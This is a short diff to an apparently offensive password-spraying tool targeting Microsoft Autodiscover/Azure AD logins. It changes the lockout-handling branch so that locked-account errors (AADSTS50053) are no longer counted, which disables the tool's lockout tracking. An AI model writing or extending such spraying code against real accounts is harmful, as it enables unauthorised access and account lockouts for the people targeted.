@@ -201,10 +201,10 @@ class Sprayer:
                         # Handle AADSTS errors - remove user from future rotations
                         if any(code in response.headers["X-AutoDiscovery-Error"] for code in Config.AADSTS_codes.keys()):
                             # This is where we handle lockout termination
-                            # NOTE: It appears that Autodiscover is now showing lockouts no accounts that are valid, but failed authentication
-                            #       so this value may not actually indicate the correct number of locked accounts.
+                            # Note: It appears that Autodiscover is now showing lockouts on accounts that are valid that failed
+                            #       authentication so we ignore this handling for now.
                             if code == "AADSTS50053":
-                                self.lockout += 1  # Keep track of locked accounts seen
+                                self.lockout += 0  # 1  # Keep track of locked accounts seen
 
                             err = Config.AADSTS_codes[code][0]
                             msg = password + " (%s. Removing from spray rotation.)\n" % (Config.AADSTS_codes[code][1])
